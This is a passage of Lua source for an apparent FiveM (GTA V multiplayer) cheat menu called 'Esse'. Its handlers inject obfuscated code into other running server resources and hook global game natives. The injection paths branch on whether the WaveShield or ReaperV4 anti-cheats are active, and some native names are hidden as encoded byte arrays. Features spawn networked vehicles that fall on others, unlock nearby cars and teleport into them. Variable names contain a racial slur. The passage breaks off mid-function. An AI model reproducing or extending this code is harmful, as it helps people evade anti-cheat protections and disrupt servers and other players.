                            values = { "airtug", "armytanker", "armytrailer", "armytrailer2", "baletrailer", "boattrailer", "boattrailer2", "boattrailer3", "caddy", "caddy2", "caddy3", "docktrailer", "docktug", "forklift", "freighttrailer", "graintrailer", "mower", "proptrailer", "raketrailer", "ripley", "sadler", "sadler2", "scrap", "slamtruck", "tanker", "tanker2", "towtruck", "towtruck2", "towtruck3", "towtruck4", "tr2", "tr3", "tr4", "tractor", "tractor2", "tractor3", "trailerlarge", "trailerlogs", "trailers", "trailers2", "trailers3", "trailers4", "trailers5", "trailersmall", "trflat", "tvtrailer", "tvtrailer2", "utillitruck", "utillitruck2", "utillitruck3" },
                            onSelect = function(selected)
                                self:SpawnSelectedVehicle(selected, TeleportInto, DeletePrevious)
                            end
                        },
                        {
                            icon = "ph ph-car",
                            label = "Vans",
                            type = "scrollable",
                            scrollType = "onEnter",
                            value = 1,
                            values = { "bison", "bison2", "bison3", "bobcatxl", "boxville", "boxville2", "boxville3", "boxville4", "boxville5", "boxville6", "burrito", "burrito2", "burrito3", "burrito4", "burrito5", "camper", "gburrito", "gburrito2", "journey", "journey2", "minivan", "minivan2", "paradise", "pony", "pony2", "rumpo", "rumpo2", "rumpo3", "speedo", "speedo2", "speedo4", "speedo5", "surfer", "surfer2", "surfer3", "taco", "youga", "youga2", "youga3", "youga4" },
                            onSelect = function(selected)
                                self:SpawnSelectedVehicle(selected, TeleportInto, DeletePrevious)
                            end
                        },
                    }
                },
                {
                    label = "Vehicle Customization",
                    tabs = {
                        -- { type = "button", label = "test button",
                        --     onSelect = function()
                        --         self:RepairVehicle()
                        --     end
                        -- },

                        -- { type = "checkbox", label = "Test", checked = false,
                        --     onSelect = function(checked)
                        --         if checked then
                        --             print("on")
                        --         else
                        --             print("off")
                        --         end
                        --     end
                        -- },
                        {
                            type = "button",
                            label = "Set License Plate",
                            desc = 'this will make u change license plate of your car',
                            onSelect = function()
                                KeyboardInput("Set License Plate", "", function(val)
                                    if val and val ~= "" then
                                        local injectedCode = string.format([[
                                        local function xKqLZVwPt9()
                                            local XcVbNmAsDfGhJkL = PlayerPedId
                                            local TyUiOpZxCvBnMzLk = GetVehiclePedIsIn
                                            local PoIuYtReWqAzXsDc = _G.SetVehicleNumberPlateText

                                            local pEd = XcVbNmAsDfGhJkL()
                                            local vEh = TyUiOpZxCvBnMzLk(pEd, false)

                                            if vEh and vEh ~= 0 then
                                                PoIuYtReWqAzXsDc(vEh, "%s")
                                            end
                                        end

                                        xKqLZVwPt9()
                                    ]], val)

                                        MachoInjectResourceRaw("any", injectedCode)
                                    else
                                        Esse:Notify("Invalid input", "Please enter a valid license plate.",
                                            "error")
                                    end
                                end, "typeable")
                            end
                        },
                        {
                            type = "button",
                            label = "Repair Vehicle",
                            desc = 'this will repair your vehicle',
                            onSelect = function()
                                self:RepairVehicle()
                            end
                        },
                        {
                            type = "button",
                            label = "Clean Vehicle",
                            desc = 'this will clean your vehicle',
                            onSelect = function()
                                Esse:Notify("success", "Esse", "Cleaned Vehicle", 3000)
                                MachoInjectResourceRaw("any", [[
                        local function qPwRYKz7mL()
                            local a = PlayerPedId
                            local b = GetVehiclePedIsIn
                            local c = SetVehicleDirtLevel

                            local ped = a()
                            local veh = b(ped, false)
                            if veh and veh ~= 0 then
                                c(veh, 0.0)
                            end
                        end

                        qPwRYKz7mL()
                        ]])
                            end
                        },
                        { type = "divider", label = "Vehicle Colors" },
                        {
                            type = "scrollable",
                            desc = 'choose color for your car',
                            label = "Primary Color",
                            scrollType = "onEnter",
                            value = 1,
                            values = { "Black", "White", "Red", "Blue", "Green", "Yellow", "Orange", "Purple", "Pink", "Gold", "Chrome", "Matte Black", "Matte Red", "Matte Blue", "Matte Green" },
                            desc = "Change the primary color of your vehicle.",
                            onSelect = function(value)
                                Esse:Notify("success", "Esse", "Primary Color: " .. value, 3000)
                                local colorMap = {
                                    ["Black"] = 0,
                                    ["White"] = 1,
                                    ["Red"] = 27,
                                    ["Blue"] = 64,
                                    ["Green"] = 53,
                                    ["Yellow"] = 42,
                                    ["Orange"] = 38,
                                    ["Purple"] = 71,
                                    ["Pink"] = 135,
                                    ["Gold"] = 37,
                                    ["Chrome"] = 120,
                                    ["Matte Black"] = 12,
                                    ["Matte Red"] = 39,
                                    ["Matte Blue"] = 82,
                                    ["Matte Green"] = 128
                                }
                                local colorId = colorMap[value] or 0
                                MachoInjectResourceRaw("any", string.format([[
                                local ped = PlayerPedId()
                                local veh = GetVehiclePedIsIn(ped, false)
                                if veh and veh ~= 0 then
                                    local _, secondary = GetVehicleColours(veh)
                                    SetVehicleColours(veh, %d, secondary)
                                end
                            ]], colorId))
                            end
                        },
                        {
                            type = "scrollable",
                            label = "Secondary Color",
                            desc = 'choose secondary color for your car',
                            scrollType = "onEnter",
                            value = 1,
                            values = { "Black", "White", "Red", "Blue", "Green", "Yellow", "Orange", "Purple", "Pink", "Gold", "Chrome", "Matte Black", "Matte Red", "Matte Blue", "Matte Green" },
                            desc = "Change the secondary color of your vehicle.",
                            onSelect = function(value)
                                Esse:Notify("success", "Esse", "Secondary Color: " .. value, 3000)
                                local colorMap = {
                                    ["Black"] = 0,
                                    ["White"] = 1,
                                    ["Red"] = 27,
                                    ["Blue"] = 64,
                                    ["Green"] = 53,
                                    ["Yellow"] = 42,
                                    ["Orange"] = 38,
                                    ["Purple"] = 71,
                                    ["Pink"] = 135,
                                    ["Gold"] = 37,
                                    ["Chrome"] = 120,
                                    ["Matte Black"] = 12,
                                    ["Matte Red"] = 39,
                                    ["Matte Blue"] = 82,
                                    ["Matte Green"] = 128
                                }
                                local colorId = colorMap[value] or 0
                                MachoInjectResourceRaw("any", string.format([[
                                local ped = PlayerPedId()
                                local veh = GetVehiclePedIsIn(ped, false)
                                if veh and veh ~= 0 then
                                    local primary, _ = GetVehicleColours(veh)
                                    SetVehicleColours(veh, primary, %d)
                                end
                            ]], colorId))
                            end
                        },
                        {
                            type = "button",
                            label = "Random Color",
                            desc = "Set a random color for your vehicle.",
                            onSelect = function()
                                Esse:Notify("success", "Esse", "Random Color Applied", 3000)
                                MachoInjectResourceRaw("any", [[
                                local ped = PlayerPedId()
                                local veh = GetVehiclePedIsIn(ped, false)
                                if veh and veh ~= 0 then
                                    local primary = math.random(0, 159)
                                    local secondary = math.random(0, 159)
                                    SetVehicleColours(veh, primary, secondary)
                                end
                            ]])
                            end
                        },
                        { type = "divider", label = "Vehicle Chaos" },
                        {
                            type = "scrollable",
                            label = "Spawn Falling Vehicles",
                            scrollType = "onEnter",
                            value = 1,
                            values = { "1 Car", "3 Cars", "5 Cars", "10 Cars", "Rain of Cars (20)" },
                            desc = "Drop random cars from the sky at your location.",
                            onSelect = function(value)
                                local count = 1
                                if value == "1 Car" then
                                    count = 1
                                elseif value == "3 Cars" then
                                    count = 3
                                elseif value == "5 Cars" then
                                    count = 5
                                elseif value == "10 Cars" then
                                    count = 10
                                elseif value == "Rain of Cars (20)" then
                                    count = 20
                                end
                                Esse:Notify("warning", "Esse", "Spawning " .. count .. " Falling Vehicle(s)",
                                    3000)
                                MachoInjectResourceRaw("any", string.format([[
                                local count = %d
                                local playerCoords = GetEntityCoords(PlayerPedId())
                                local vehicles = {"adder", "zentorno", "t20", "infernus", "cheetah", "turismor", "entity2", "osiris", "pfister811", "vagner", "nero", "autarch", "xa21", "deveste", "emerus", "krieger", "thrax", "furia", "tigon", "champion"}

                                for i = 1, count do
                                    local vehicleName = vehicles[math.random(1, #vehicles)]
                                    local modelHash = GetHashKey(vehicleName)
                                    RequestModel(modelHash)
                                    while not HasModelLoaded(modelHash) do Wait(10) end

                                    local offsetX = math.random(-20, 20)
                                    local offsetY = math.random(-20, 20)
                                    local height = math.random(50, 100)
                                    local spawnCoords = vector3(playerCoords.x + offsetX, playerCoords.y + offsetY, playerCoords.z + height)

                                    local veh = CreateVehicle(modelHash, spawnCoords.x, spawnCoords.y, spawnCoords.z, math.random(0, 360), true, true)
                                    SetModelAsNoLongerNeeded(modelHash)

                                    -- Make visible to others
                                    NetworkRegisterEntityAsNetworked(veh)
                                    local netId = NetworkGetNetworkIdFromEntity(veh)
                                    SetNetworkIdCanMigrate(netId, true)
                                    SetNetworkIdExistsOnAllMachines(netId, true)
                                    SetEntityAsMissionEntity(veh, true, true)

                                    SetVehicleOnGroundProperly(veh)

                                    Wait(100)
                                end
                            ]], count))
                            end
                        },
                        {
                            type = "button",
                            label = "Force Vehicle Engine",
                            desc = 'this will force your vehicle engine',
                            onSelect = function()
                                Injection(
                                GetResourceState("monitor") == "started" and "monitor" or
                                GetResourceState("ox_lib") == "started" and "ox_lib" or "any", [[
                            function hNative(nativeName, newFunction)
                                local originalNative = _G[nativeName]
                                if not originalNative or type(originalNative) ~= "function" then
                                    return
                                end

                                _G[nativeName] = function(...)
                                    return newFunction(originalNative, ...)
                                end
                            end

                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetVehiclePedIsTryingToEnter", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetVehicleEngineOn", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetVehicleUndriveable", function(originalFn, ...) return originalFn(...) end)
                            hNative("IsPedInVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("IsPedInVehicle", function(originalFn, ...) return false end)
                            hNative("SetVehicleEngineCanDegrade", function(originalFn, ...) return false end)
                            hNative("SetVehicleKeepEngineOnWhenAbandoned", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetVehicleEngineHealth", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetVehicleEngineHealth", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetVehicleEngineCanDegrade", function(originalFn, ...) return originalFn(...) end)
                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                            if GhYtReFdCxWaQzLp == nil then GhYtReFdCxWaQzLp = false end
                            GhYtReFdCxWaQzLp = true

                            local function OpAsDfGhJkLzXcVb()
                                local lMnbVcXzZaSdFg = CreateThread
                                lMnbVcXzZaSdFg(function()
                                    local QwErTyUiOp         = _G.PlayerPedId
                                    local AsDfGhJkLz         = _G.GetVehiclePedIsIn
                                    local TyUiOpAsDfGh       = _G.GetVehiclePedIsTryingToEnter
                                    local ZxCvBnMqWeRtYu     = _G.SetVehicleEngineOn
                                    local ErTyUiOpAsDfGh     = _G.SetVehicleUndriveable
                                    local KeEpOnAb           = _G.SetVehicleKeepEngineOnWhenAbandoned
                                    local En_g_Health_Get    = _G.GetVehicleEngineHealth
                                    local En_g_Health_Set    = _G.SetVehicleEngineHealth
                                    local En_g_Degrade_Set   = _G.SetVehicleEngineCanDegrade
                                    local No_Hotwire_Set     = _G.SetVehicleNeedsToBeHotwired

                                    local function _tick(vh)
                                        if vh and vh ~= 0 then
                                            No_Hotwire_Set(vh, false)
                                            En_g_Degrade_Set(vh, false)
                                            ErTyUiOpAsDfGh(vh, false)
                                            KeEpOnAb(vh, true)

                                            local eh = En_g_Health_Get(vh)
                                            if (not eh) or eh < 300.0 then
                                                En_g_Health_Set(vh, 900.0)
                                            end

                                            ZxCvBnMqWeRtYu(vh, true, true, true)
                                        end
                                    end

                                    while GhYtReFdCxWaQzLp and not Unloaded do
                                        local p  = QwErTyUiOp()

                                        _tick(AsDfGhJkLz(p, false))
                                        _tick(TyUiOpAsDfGh(p))
                                        _tick(AsDfGhJkLz(p, true))

                                        Wait(0)
                                    end
                                end)
                            end

                            OpAsDfGhJkLzXcVb()
                        ]])
                            end,
                            function()
                                Injection(
                                GetResourceState("monitor") == "started" and "monitor" or
                                GetResourceState("ox_lib") == "started" and "ox_lib" or "any", [[

                            function hNative(nativeName, newFunction)
                                local originalNative = _G[nativeName]
                                if not originalNative or type(originalNative) ~= "function" then
                                    return
                                end

                                _G[nativeName] = function(...)
                                    return newFunction(originalNative, ...)
                                end
                            end

                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetVehiclePedIsTryingToEnter", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetVehicleEngineOn", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetVehicleUndriveable", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetVehicleKeepEngineOnWhenAbandoned", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetVehicleEngineHealth", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetVehicleEngineHealth", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetVehicleEngineCanDegrade", function(originalFn, ...) return originalFn(...) end)
                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                            GhYtReFdCxWaQzLp = false
                            local v = GetVehiclePedIsIn(PlayerPedId(), false)
                            if v and v ~= 0 then
                                SetVehicleKeepEngineOnWhenAbandoned(v, false)
                                SetVehicleEngineCanDegrade(v, true)
                                SetVehicleUndriveable(v, false)
                            end
                        ]])
                            end
                        },
                        {
                            type = "button",
                            label = "Max Upgrade",
                            desc = 'this will max upgrade your vehicle',
                            onSelect = function()
                                Esse:Notify("success", "Esse", "Vehicle Max Upgraded", 3000)
                                local WaveNiggaStarted = GetResourceState("WaveShield") == 'started'
                                local ReaperNiggaStarted = GetResourceState("ReaperV4") == 'started'
                                if WaveNiggaStarted then
                                    MachoInjectResourceRaw("any", [[
                            local function XzPmLqRnWyBtVkGhQe()
                                local FnUhIpOyLkTrEzSd = PlayerPedId
                                local VmBgTnQpLcZaWdEx = GetVehiclePedIsIn
                                local RfDsHuNjMaLpOyBt = SetVehicleModKit
                                local AqWsEdRzXcVtBnMa = SetVehicleWheelType
                                local TyUiOpAsDfGhJkLz = GetNumVehicleMods
                                local QwErTyUiOpAsDfGh = SetVehicleMod
                                local ZxCvBnMqWeRtYuIo = ToggleVehicleMod
                                local MnBvCxZaSdFgHjKl = SetVehicleWindowTint
                                local LkJhGfDsQaZwXeCr = SetVehicleTyresCanBurst
                                local UjMiKoLpNwAzSdFg = SetVehicleExtra
                                local RvTgYhNuMjIkLoPb = DoesExtraExist

                                local lzQwXcVeTrBnMkOj = FnUhIpOyLkTrEzSd()
                                local jwErTyUiOpMzNaLk = VmBgTnQpLcZaWdEx(lzQwXcVeTrBnMkOj, false)
                                if not jwErTyUiOpMzNaLk or jwErTyUiOpMzNaLk == 0 then return end

                                RfDsHuNjMaLpOyBt(jwErTyUiOpMzNaLk, 0)
                                AqWsEdRzXcVtBnMa(jwErTyUiOpMzNaLk, 7)

                                for XyZoPqRtWnEsDfGh = 0, 16 do
                                    local uYtReWqAzXsDcVf = TyUiOpAsDfGhJkLz(jwErTyUiOpMzNaLk, XyZoPqRtWnEsDfGh)
                                    if uYtReWqAzXsDcVf and uYtReWqAzXsDcVf > 0 then
                                        QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, XyZoPqRtWnEsDfGh, uYtReWqAzXsDcVf - 1, false)
                                    end
                                end

                                QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 14, 16, false)

                                local aSxDcFgHiJuKoLpM = TyUiOpAsDfGhJkLz(jwErTyUiOpMzNaLk, 15)
                                if aSxDcFgHiJuKoLpM and aSxDcFgHiJuKoLpM > 1 then
                                    QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 15, aSxDcFgHiJuKoLpM - 2, false)
                                end

                                for QeTrBnMkOjHuYgFv = 17, 22 do
                                    ZxCvBnMqWeRtYuIo(jwErTyUiOpMzNaLk, QeTrBnMkOjHuYgFv, true)
                                end

                                QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 23, 1, false)
                                QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 24, 1, false)

                                for TpYuIoPlMnBvCxZq = 1, 12 do
                                    if RvTgYhNuMjIkLoPb(jwErTyUiOpMzNaLk, TpYuIoPlMnBvCxZq) then
                                        UjMiKoLpNwAzSdFg(jwErTyUiOpMzNaLk, TpYuIoPlMnBvCxZq, false)
                                    end
                                end

                                MnBvCxZaSdFgHjKl(jwErTyUiOpMzNaLk, 1)
                                LkJhGfDsQaZwXeCr(jwErTyUiOpMzNaLk, false)
                            end

                            XzPmLqRnWyBtVkGhQe()
                        ]])
                                elseif ReaperNiggaStarted then
                                    MachoInjectThread(0, "any", "", [[
                            local function XzPmLqRnWyBtVkGhQe()
                                local FnUhIpOyLkTrEzSd = PlayerPedId
                                local VmBgTnQpLcZaWdEx = GetVehiclePedIsIn
                                local RfDsHuNjMaLpOyBt = SetVehicleModKit
                                local AqWsEdRzXcVtBnMa = SetVehicleWheelType
                                local TyUiOpAsDfGhJkLz = GetNumVehicleMods
                                local QwErTyUiOpAsDfGh = SetVehicleMod
                                local ZxCvBnMqWeRtYuIo = ToggleVehicleMod
                                local MnBvCxZaSdFgHjKl = SetVehicleWindowTint
                                local LkJhGfDsQaZwXeCr = SetVehicleTyresCanBurst
                                local UjMiKoLpNwAzSdFg = SetVehicleExtra
                                local RvTgYhNuMjIkLoPb = DoesExtraExist

                                local lzQwXcVeTrBnMkOj = FnUhIpOyLkTrEzSd()
                                local jwErTyUiOpMzNaLk = VmBgTnQpLcZaWdEx(lzQwXcVeTrBnMkOj, false)
                                if not jwErTyUiOpMzNaLk or jwErTyUiOpMzNaLk == 0 then return end

                                RfDsHuNjMaLpOyBt(jwErTyUiOpMzNaLk, 0)
                                AqWsEdRzXcVtBnMa(jwErTyUiOpMzNaLk, 7)

                                for XyZoPqRtWnEsDfGh = 0, 16 do
                                    local uYtReWqAzXsDcVf = TyUiOpAsDfGhJkLz(jwErTyUiOpMzNaLk, XyZoPqRtWnEsDfGh)
                                    if uYtReWqAzXsDcVf and uYtReWqAzXsDcVf > 0 then
                                        QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, XyZoPqRtWnEsDfGh, uYtReWqAzXsDcVf - 1, false)
                                    end
                                end

                                QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 14, 16, false)

                                local aSxDcFgHiJuKoLpM = TyUiOpAsDfGhJkLz(jwErTyUiOpMzNaLk, 15)
                                if aSxDcFgHiJuKoLpM and aSxDcFgHiJuKoLpM > 1 then
                                    QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 15, aSxDcFgHiJuKoLpM - 2, false)
                                end

                                for QeTrBnMkOjHuYgFv = 17, 22 do
                                    ZxCvBnMqWeRtYuIo(jwErTyUiOpMzNaLk, QeTrBnMkOjHuYgFv, true)
                                end

                                QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 23, 1, false)
                                QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 24, 1, false)

                                for TpYuIoPlMnBvCxZq = 1, 12 do
                                    if RvTgYhNuMjIkLoPb(jwErTyUiOpMzNaLk, TpYuIoPlMnBvCxZq) then
                                        UjMiKoLpNwAzSdFg(jwErTyUiOpMzNaLk, TpYuIoPlMnBvCxZq, false)
                                    end
                                end

                                MnBvCxZaSdFgHjKl(jwErTyUiOpMzNaLk, 1)
                                LkJhGfDsQaZwXeCr(jwErTyUiOpMzNaLk, false)
                            end

                            XzPmLqRnWyBtVkGhQe()
                        ]])
                                else
                                    MachoInjectResourceRaw("any", [[
                            local function XzPmLqRnWyBtVkGhQe()
                                local FnUhIpOyLkTrEzSd = PlayerPedId
                                local VmBgTnQpLcZaWdEx = GetVehiclePedIsIn
                                local RfDsHuNjMaLpOyBt = SetVehicleModKit
                                local AqWsEdRzXcVtBnMa = SetVehicleWheelType
                                local TyUiOpAsDfGhJkLz = GetNumVehicleMods
                                local QwErTyUiOpAsDfGh = SetVehicleMod
                                local ZxCvBnMqWeRtYuIo = ToggleVehicleMod
                                local MnBvCxZaSdFgHjKl = SetVehicleWindowTint
                                local LkJhGfDsQaZwXeCr = SetVehicleTyresCanBurst
                                local UjMiKoLpNwAzSdFg = SetVehicleExtra
                                local RvTgYhNuMjIkLoPb = DoesExtraExist

                                local lzQwXcVeTrBnMkOj = FnUhIpOyLkTrEzSd()
                                local jwErTyUiOpMzNaLk = VmBgTnQpLcZaWdEx(lzQwXcVeTrBnMkOj, false)
                                if not jwErTyUiOpMzNaLk or jwErTyUiOpMzNaLk == 0 then return end

                                RfDsHuNjMaLpOyBt(jwErTyUiOpMzNaLk, 0)
                                AqWsEdRzXcVtBnMa(jwErTyUiOpMzNaLk, 7)

                                for XyZoPqRtWnEsDfGh = 0, 16 do
                                    local uYtReWqAzXsDcVf = TyUiOpAsDfGhJkLz(jwErTyUiOpMzNaLk, XyZoPqRtWnEsDfGh)
                                    if uYtReWqAzXsDcVf and uYtReWqAzXsDcVf > 0 then
                                        QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, XyZoPqRtWnEsDfGh, uYtReWqAzXsDcVf - 1, false)
                                    end
                                end

                                QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 14, 16, false)

                                local aSxDcFgHiJuKoLpM = TyUiOpAsDfGhJkLz(jwErTyUiOpMzNaLk, 15)
                                if aSxDcFgHiJuKoLpM and aSxDcFgHiJuKoLpM > 1 then
                                    QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 15, aSxDcFgHiJuKoLpM - 2, false)
                                end

                                for QeTrBnMkOjHuYgFv = 17, 22 do
                                    ZxCvBnMqWeRtYuIo(jwErTyUiOpMzNaLk, QeTrBnMkOjHuYgFv, true)
                                end

                                QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 23, 1, false)
                                QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 24, 1, false)

                                for TpYuIoPlMnBvCxZq = 1, 12 do
                                    if RvTgYhNuMjIkLoPb(jwErTyUiOpMzNaLk, TpYuIoPlMnBvCxZq) then
                                        UjMiKoLpNwAzSdFg(jwErTyUiOpMzNaLk, TpYuIoPlMnBvCxZq, false)
                                    end
                                end

                                MnBvCxZaSdFgHjKl(jwErTyUiOpMzNaLk, 1)
                                LkJhGfDsQaZwXeCr(jwErTyUiOpMzNaLk, false)
                            end

                            XzPmLqRnWyBtVkGhQe()
                        ]])
                                end
                            end
                        },
                        {
                            type = "button",
                            label = "Delete Vehicle",
                            desc = 'this will delete your vehicle',
                            onSelect = function()
                                Esse:Notify("success", "Esse", "Deleted Vehicle", 3000)
                                MachoInjectResourceRaw("any", [[
                        local function LXpTqWvR80()
                            local aQw = PlayerPedId
                            local bEr = GetVehiclePedIsIn
                            local cTy = DoesEntityExist
                            local dUi = NetworkHasControlOfEntity
                            local eOp = SetEntityAsMissionEntity
                            local fAs = DeleteEntity
                            local gDf = DeleteVehicle
                            local hJk = SetVehicleHasBeenOwnedByPlayer

                            local ped = aQw()
                            local veh = bEr(ped, false)

                            if veh and veh ~= 0 and cTy(veh) then
                                hJk(veh, true)
                                eOp(veh, true, true)

                                if dUi(veh) then
                                    fAs(veh)
                                    gDf(veh)
                                end
                            end

                        end

                        LXpTqWvR80()
                        ]])
                            end
                        },
                        {
                            type = "button",
                            label = "Random Color",
                            desc = 'this will give u random color for your car',
                            onSelect = function()
                                local veh = GetVehiclePedIsIn(PlayerPedId(), false)
                                if veh ~= 0 then
                                    SetVehicleColours(veh, math.random(0, 159), math.random(0, 159))
                                    Esse:Notify("success", "Esse", "Random colors applied!", 3000)
                                else
                                    Esse:Notify("error", "Esse", "You must be in a vehicle!", 3000)
                                end
                            end
                        },
                        { type = "divider", label = "Fun" },
                        {
                            type = "button",
                            label = "Spawn Vehicle Rain",
                            desc = "Drop random cars from the sky at your location",
                            onSelect = function()
                                local coords = GetEntityCoords(PlayerPedId())
                                local vehicles = { "adder", "zentorno", "turismor", "entityxf", "infernus", "bullet",
                                    "cheetah" }
                                for i = 1, 5 do
                                    local model = GetHashKey(vehicles[math.random(#vehicles)])
                                    RequestModel(model)
                                    local timeout = 0
                                    while not HasModelLoaded(model) and timeout < 50 do
                                        Wait(100)
                                        timeout = timeout + 1
                                    end
                                    if HasModelLoaded(model) then
                                        local veh = CreateVehicle(model, coords.x + math.random(-10, 10),
                                            coords.y + math.random(-10, 10), coords.z + 50.0 + (i * 10),
                                            math.random(0, 360), true, false)
                                        SetEntityAsNoLongerNeeded(veh)
                                    end
                                end
                                Esse:Notify("success", "Esse", "Vehicle rain started!", 3000)
                            end
                        },
                        {
                            type = "button",
                            label = "Unlock Closest Vehicle",
                            onSelect = function()
                                Esse:Notify("success", "Esse", "Deleted Vehicle", 3000)
                                MachoInjectResourceRaw("any", [[
                        local function TpLMqKtXwZ()
                            local AsoYuTrBnMvCxZaQw = PlayerPedId
                            local GhrTnLpKjUyVbMnZx = GetEntityCoords
                            local UyeWsDcXzQvBnMaLp = GetClosestVehicle
                            local ZmkLpQwErTyUiOpAs = DoesEntityExist
                            local VczNmLoJhBgVfCdEx = SetEntityAsMissionEntity
                            local EqWoXyBkVsNzQuH = SetVehicleDoorsLocked
                            local YxZwQvTrBnMaSdFgHj = SetVehicleDoorsLockedForAllPlayers
                            local RtYuIoPlMnBvCxZaSd = SetVehicleHasBeenOwnedByPlayer
                            local LkJhGfDsAzXwCeVrBt = NetworkHasControlOfEntity

                            local ped = AsoYuTrBnMvCxZaQw()
                            local coords = GhrTnLpKjUyVbMnZx(ped)
                            local veh = UyeWsDcXzQvBnMaLp(coords.x, coords.y, coords.z, 10.0, 0, 70)

                            if veh and ZmkLpQwErTyUiOpAs(veh) and LkJhGfDsAzXwCeVrBt(veh) then
                                VczNmLoJhBgVfCdEx(veh, true, true)
                                RtYuIoPlMnBvCxZaSd(veh, true)
                                EqWoXyBkVsNzQuH(veh, 1)
                                YxZwQvTrBnMaSdFgHj(veh, false)
                            end

                        end

                        TpLMqKtXwZ()
                        ]])
                            end
                        },
                        {
                            type = "button",
                            label = "Teleport into Closest Vehicle",
                            desc = 'this will teleport you into the closest vehicle',
                            onSelect = function()
                                Esse:Notify("success", "Esse", "Teleported into Vehicle", 3000)
                                MachoInjectResourceRaw(
                                GetResourceState("monitor") == "started" and "monitor" or
                                GetResourceState("ox_lib") == "started" and "ox_lib" or "any", [[
                        function hNative(nativeName, newFunction)
                            local originalNative = _G[nativeName]
                            if not originalNative or type(originalNative) ~= "function" then
                                return
                            end

                            _G[nativeName] = function(...)
                                return newFunction(originalNative, ...)
                            end
                        end

                        hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                        hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                        hNative("GetClosestVehicle", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetVehicleForwardSpeed", function(originalFn, ...) return originalFn(...) end)
                        hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                        hNative("IsPedInAnyVehicle", function(originalFn, ...) return originalFn(...) end)
                        hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                        hNative("GetPedInVehicleSeat", function(originalFn, ...) return originalFn(...) end)
                        hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                        local function uPKcoBaEHmnK()
                            local ziCFzHyzxaLX = SetPedIntoVehicle
                            local YPPvDlOGBghA = GetClosestVehicle

                            local Coords = GetEntityCoords(PlayerPedId())
                            local vehicle = YPPvDlOGBghA(Coords.x, Coords.y, Coords.z, 15.0, 0, 70)

                            if DoesEntityExist(vehicle) and not IsPedInAnyVehicle(PlayerPedId(), false) then
                                if GetPedInVehicleSeat(vehicle, -1) == 0 then
                                    ziCFzHyzxaLX(PlayerPedId(), vehicle, -1)
                                else
                                    ziCFzHyzxaLX(PlayerPedId(), vehicle, 0)
                                end
                            end
                        end

                        uPKcoBaEHmnK()
                        ]])
                            end
                        },
                        { type = "divider", label = "Toggles" },
                        {
                            type = "checkbox",
                            label = "Boost Vehicle",
                            desc = 'this will boost your vehicle when you hold SHIFT',
                            checked = false,
                            onSelect = function(checked)
                                if checked then
                                    Esse:Notify("success", "Esse", "Boost Vehicle On", 3000)

                                    if GetResourceState("WaveShield") == "started" then
                                        Injection(
                                        GetResourceState("WaveShield") == "started" and "WaveShield" or
                                        GetResourceState("ox_lib") == "started" and "ox_lib" or "any", [[
                                        local function decode(tbl)
                                            local s = ""
                                            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                            return s
                                        end

                                        local function g(n)
                                            return _G[decode(n)]
                                        end

                                        if not _G.superSpeedBoost then
                                            _G.superSpeedBoost = true

                                            local PlayerPedId_fn       = g({80,108,97,121,101,114,80,101,100,73,100})
                                            local GetVehiclePedIsIn_fn = g({71,101,116,86,101,104,105,99,108,101,80,101,100,73,115,73,110})
                                            local IsPedInAnyVehicle_fn = g({73,115,80,101,100,73,110,65,110,121,86,101,104,105,99,108,101})
                                            local IsControlPressed_fn  = g({73,115,67,111,110,116,114,111,108,80,114,101,115,115,101,100})
                                            local SetVehicleForwardSpeed_fn = g({83,101,116,86,101,104,105,99,108,101,70,111,114,119,97,114,100,83,112,101,101,100})
                                            local Wait_fn              = g({87,97,105,116})

                                            _G.superSpeedBoostEnabled = true

                                            local function initFlow(cb)
                                                local co = coroutine.create(cb)
                                                local function execCycle()
                                                    while coroutine.status(co) ~= "dead" do
                                                        local ok, err = coroutine.resume(co)
                                                        if not ok then

                                                            break
                                                        end
                                                        Wait_fn(0)
                                                    end
                                                end
                                                execCycle()
                                            end

                                            initFlow(function()
                                                while _G.superSpeedBoostEnabled do
                                                    if not _G.superSpeedBoostEnabled then break end

                                                    local ped = PlayerPedId_fn()
                                                    if IsControlPressed_fn(0, 209) and IsPedInAnyVehicle_fn(ped, false) then
                                                        local veh = GetVehiclePedIsIn_fn(ped, false)
